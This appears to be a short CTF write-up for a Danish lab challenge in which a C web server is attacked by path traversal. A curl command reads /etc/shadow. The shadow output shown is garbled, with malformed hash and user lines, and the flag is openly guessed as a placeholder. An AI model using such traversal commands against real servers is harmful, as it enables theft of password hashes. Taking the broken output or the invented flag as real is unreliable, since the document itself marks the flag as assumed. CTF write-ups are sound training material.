# Find My Files
## Challenge
- **Solves**: 16
- **Name**: Find my files
- **Points**: 162

## Description
Fin har lige opdaget hvordan hjemmesider virker, man giver bare en fil til dem som gerne vil se den. Han sagde at han har lavet en hjemmeside hvor du kan se alfabetet, men noget siger mig at den kan give flere filer end det er intentionen. Han har dog valgt at skrive den i C, hvilket han skal have stor ros for. Han kører også SSH for at kunne tjekke om folk har fundet filen.  

[http://alfabet.hkn](http://alfabet.hkn)  

**NOTE**: Create a user and find the VPN and Browser LABs on Campfire Labs

## Solution
We can use path traversal and read `/etc/shadow` like this:  
```bash
curl http://alfabet.hkn/app/../../etc/shadow
```

Output:  
```
root:3e3yvfsp12pin3px0Y852F250kn6BjqWfQpype5Yf/pnf/ukgWPS70tGdrqya3JcP/qsongRO541f77u9.FokeY62ppdw
quryun14000:19991:0:99999:7::
funn:0:19973:0:99999:7::
syn:0:19873:0:99999:7::
...
```

## Flag
*(Not explicitly provided in the document, but implied to be in the shadow file or related to the challenge)*  
`DDC{<some_flag_related_to_path_traversal>}` *(Assumed based on context)*